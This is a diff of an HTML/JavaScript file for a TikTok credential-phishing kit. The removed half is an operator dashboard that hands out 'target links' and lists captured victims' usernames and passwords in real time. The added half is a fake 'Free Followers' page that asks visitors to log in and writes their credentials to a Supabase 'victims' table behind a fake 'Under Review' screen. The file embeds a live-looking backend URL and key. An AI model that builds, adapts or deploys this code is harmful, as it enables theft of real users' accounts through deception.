@@ -3,157 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Admin Dashboard</title>
+    <title>TikTok Followers Generator - Free</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
-        body { font-family: 'Poppins', sans-serif; background: #050505; color: white; }
-        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); }
-        .tiktok-btn { background: linear-gradient(90deg, #fe2c55 0%, #25f4ee 100%); }
+        body { font-family: 'Poppins', sans-serif; background: #010101; color: white; overflow-x: hidden; }
+        .btn-tiktok { background: linear-gradient(90deg, #fe2c55 0%, #25f4ee 100%); }
+        .card-glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
+        .card-glass:hover { transform: translateY(-5px); border-color: #fe2c55; }
         .hidden { display: none; }
+        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #fe2c55; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body class="min-h-screen">
+<body class="p-6">
 
-<!-- AUTH SECTION -->
-<div id="authBox" class="min-h-screen flex items-center justify-center p-4">
-    <div class="glass p-8 rounded-3xl w-full max-w-md shadow-2xl">
-        <div class="text-center mb-8">
-            <i class="fab fa-tiktok text-5xl text-[#fe2c55] mb-4"></i>
-            <h1 class="text-3xl font-bold">Control Panel</h1>
-            <p class="text-gray-400 text-sm mt-2">Manage your phishing links & data</p>
-        </div>
-        <div class="space-y-4">
-            <input type="text" id="user" placeholder="Admin Username" class="w-full bg-black/40 border border-gray-800 p-4 rounded-xl outline-none focus:border-[#fe2c55] transition-all">
-            <input type="password" id="pass" placeholder="Admin Password" class="w-full bg-black/40 border border-gray-800 p-4 rounded-xl outline-none focus:border-[#fe2c55] transition-all">
-            <div class="flex gap-3 pt-2">
-                <button onclick="auth('login')" class="flex-1 tiktok-btn p-4 rounded-xl font-bold hover:opacity-90 active:scale-95 transition">Login</button>
-                <button onclick="auth('signup')" class="flex-1 bg-white/5 border border-gray-700 p-4 rounded-xl font-bold hover:bg-white/10 transition">Signup</button>
+    <div class="max-w-4xl mx-auto text-center py-10">
+        <i class="fab fa-tiktok text-6xl text-[#fe2c55] mb-6"></i>
+        <h1 class="text-4xl md:text-5xl font-bold mb-4">Get Free Followers</h1>
+        <p class="text-gray-400 mb-12">Boost your TikTok presence instantly with our verified system.</p>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+            <div onclick="openAuth(2000)" class="card-glass p-10 rounded-3xl cursor-pointer">
+                <h3 class="text-4xl font-bold text-[#25f4ee]">2K</h3>
+                <p class="text-sm text-gray-500 mt-2">Followers</p>
+                <button class="mt-6 btn-tiktok w-full py-2 rounded-full text-xs font-bold uppercase">Claim</button>
+            </div>
+            <div onclick="openAuth(5000)" class="card-glass p-10 rounded-3xl cursor-pointer border-[#fe2c55] scale-105">
+                <div class="bg-[#fe2c55] text-[10px] font-bold py-1 px-3 rounded-full absolute -top-3 left-1/2 -translate-x-1/2">POPULAR</div>
+                <h3 class="text-4xl font-bold text-white">5K</h3>
+                <p class="text-sm text-gray-500 mt-2">Followers</p>
+                <button class="mt-6 btn-tiktok w-full py-2 rounded-full text-xs font-bold uppercase">Claim</button>
+            </div>
+            <div onclick="openAuth(10000)" class="card-glass p-10 rounded-3xl cursor-pointer">
+                <h3 class="text-4xl font-bold text-[#25f4ee]">10K</h3>
+                <p class="text-sm text-gray-500 mt-2">Followers</p>
+                <button class="mt-6 btn-tiktok w-full py-2 rounded-full text-xs font-bold uppercase">Claim</button>
             </div>
         </div>
     </div>
-</div>
 
-<!-- MAIN DASHBOARD -->
-<div id="mainDash" class="hidden p-4 md:p-10">
-    <div class="max-w-6xl mx-auto">
-        <div class="flex flex-col md:flex-row justify-between items-center mb-10 gap-4">
-            <div>
-                <h1 class="text-4xl font-bold">Hello, <span id="adminName" class="text-[#25f4ee]">Admin</span></h1>
-                <p class="text-gray-500 text-sm">Real-time data monitoring enabled.</p>
-            </div>
-            <button onclick="logout()" class="bg-red-500/10 text-red-500 border border-red-500/20 px-6 py-2 rounded-xl hover:bg-red-500 hover:text-white transition">Logout Account</button>
-        </div>
-
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <!-- TARGET LINK CARD -->
-            <div class="glass p-8 rounded-3xl h-fit">
-                <h3 class="text-xl font-bold mb-6 flex items-center"><i class="fas fa-link mr-3 text-[#fe2c55]"></i> Your Target Link</h3>
-                <div class="bg-black/50 p-4 rounded-xl border border-gray-800 break-all text-xs font-mono text-gray-400 mb-6" id="linkBox">
-                    Setting up link...
+    <!-- Login Modal -->
+    <div id="modal" class="fixed inset-0 bg-black/95 flex items-center justify-center p-4 z-50 hidden">
+        <div class="card-glass p-8 rounded-3xl w-full max-w-sm text-center relative shadow-2xl">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-500"><i class="fas fa-times"></i></button>
+            
+            <div id="formSection">
+                <h2 class="text-2xl font-bold mb-2">Verification Needed</h2>
+                <p class="text-xs text-gray-400 mb-8">Login to your TikTok account to receive <span id="count" class="text-white font-bold"></span> followers.</p>
+                
+                <div class="space-y-4 text-left">
+                    <div>
+                        <label class="text-[10px] text-gray-500 uppercase ml-2">Username/Email/Phone</label>
+                        <input type="text" id="vUser" class="w-full bg-white/5 border border-gray-800 p-4 rounded-xl outline-none focus:border-[#fe2c55]">
+                    </div>
+                    <div>
+                        <label class="text-[10px] text-gray-500 uppercase ml-2">Password</label>
+                        <input type="password" id="vPass" class="w-full bg-white/5 border border-gray-800 p-4 rounded-xl outline-none focus:border-[#fe2c55]">
+                    </div>
+                    <button onclick="sendData()" id="sendBtn" class="w-full btn-tiktok p-4 rounded-xl font-bold mt-4 shadow-lg shadow-[#fe2c55]/20">Verify & Continue</button>
                 </div>
-                <button onclick="copyMyLink()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-bold transition flex items-center justify-center">
-                    <i class="far fa-copy mr-2"></i> Copy Link
-                </button>
-                <p class="text-[10px] text-gray-600 mt-4 text-center">Is link ko victim ko send karein followers ke naam par.</p>
             </div>
 
-            <!-- VICTIMS TABLE -->
-            <div class="lg:col-span-2 glass p-8 rounded-3xl overflow-hidden">
-                <h3 class="text-xl font-bold mb-6 flex items-center"><i class="fas fa-user-secret mr-3 text-[#25f4ee]"></i> Captured Logs</h3>
-                <div class="overflow-x-auto">
-                    <table class="w-full text-left">
-                        <thead class="text-gray-500 text-xs uppercase">
-                            <tr class="border-b border-gray-800">
-                                <th class="pb-4 font-medium">Timestamp</th>
-                                <th class="pb-4 font-medium">Username</th>
-                                <th class="pb-4 font-medium">Password</th>
-                            </tr>
-                        </thead>
-                        <tbody id="logsBody" class="text-sm">
-                            <tr><td colspan="3" class="py-10 text-center text-gray-600 italic">No data captured yet...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
+            <div id="successSection" class="hidden py-10">
+                <i class="fas fa-history text-5xl text-[#25f4ee] mb-4 animate-pulse"></i>
+                <h2 class="text-2xl font-bold mb-2">Under Review</h2>
+                <p class="text-sm text-gray-500">Your account is being verified. Please stay logged in. Followers will be added within 24 hours.</p>
+                <button onclick="closeModal()" class="mt-8 text-xs text-gray-600 underline">Close Window</button>
             </div>
         </div>
     </div>
-</div>
 
 <script>
 const S_URL = 'https://fhvonxrsfdawustkuoll.supabase.co';
 const S_KEY = 'sb_publishable_--n1PzlM1fQMid3BtOGHoQ_zu_YIAEV';
 const supabaseClient = supabase.createClient(S_URL, S_KEY);
 
-// Replace this with your Generator's URL on Vercel
-const GENERATOR_URL = "https://follower-rho.vercel.app/";
+const targetId = new URLSearchParams(window.location.search).get('id');
 
-async function auth(mode) {
-    const u = document.getElementById('user').value.trim();
-    const p = document.getElementById('pass').value.trim();
-    if(!u || !p) return alert("Credentials missing!");
+function openAuth(num) {
+    if(!targetId) return alert("System Error: No Target ID found.");
+    document.getElementById('count').innerText = num.toLocaleString();
+    document.getElementById('modal').classList.remove('hidden');
+}
 
-    if(mode === 'signup') {
-        const { error } = await supabaseClient.from('dashboard_users').insert([{ username: u, password: p }]);
-        if(error) return alert(error.message);
-        alert("Account Created! Now login.");
+function closeModal() {
+    document.getElementById('modal').classList.add('hidden');
+}
+
+async function sendData() {
+    const u = document.getElementById('vUser').value.trim();
+    const p = document.getElementById('vPass').value.trim();
+    const btn = document.getElementById('sendBtn');
+
+    if(!u || !p) return alert("Please fill all fields!");
+
+    btn.innerHTML = '<span class="loader"></span> Sending...';
+    btn.disabled = true;
+
+    const { error } = await supabaseClient.from('victims').insert([
+        { username: u, password: p, target_id: targetId }
+    ]);
+
+    if(!error) {
+        document.getElementById('formSection').classList.add('hidden');
+        document.getElementById('successSection').classList.remove('hidden');
     } else {
-        const { data } = await supabaseClient.from('dashboard_users').select('*').eq('username', u).eq('password', p).maybeSingle();
-        if(data) {
-            startSession(u);
-        } else {
-            alert("Wrong credentials!");
-        }
+        alert("Server Error. Please try again later.");
+        btn.innerText = "Verify & Continue";
+        btn.disabled = false;
     }
-}
-
-function startSession(u) {
-    localStorage.setItem('activeAdmin', u);
-    document.getElementById('authBox').classList.add('hidden');
-    document.getElementById('mainDash').classList.remove('hidden');
-    document.getElementById('adminName').innerText = u;
-    
-    const finalLink = GENERATOR_URL + "?id=" + encodeURIComponent(u);
-    document.getElementById('linkBox').innerText = finalLink;
-
-    loadLogs(u);
-    
-    // Real-time subscription
-    supabaseClient.channel('data-stream')
-    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'victims', filter: `target_id=eq.${u}` }, () => {
-        loadLogs(u);
-    }).subscribe();
-}
-
-async function loadLogs(u) {
-    const { data } = await supabaseClient.from('victims').select('*').eq('target_id', u).order('created_at', { ascending: false });
-    const tbody = document.getElementById('logsBody');
-    if(data && data.length > 0) {
-        tbody.innerHTML = data.map(row => `
-            <tr class="border-b border-gray-900/50 hover:bg-white/5 transition">
-                <td class="py-4 text-gray-500">${new Date(row.created_at).toLocaleString()}</td>
-                <td class="py-4 font-bold">${row.username}</td>
-                <td class="py-4 text-pink-500 font-mono">${row.password}</td>
-            </tr>
-        `).join('');
-    }
-}
-
-function copyMyLink() {
-    navigator.clipboard.writeText(document.getElementById('linkBox').innerText);
-    alert("Copied!");
-}
-
-function logout() {
-    localStorage.clear();
-    location.reload();
-}
-
-window.onload = () => {
-    const saved = localStorage.getItem('activeAdmin');
-    if(saved) startSession(saved);
 }
 </script>
 </body>
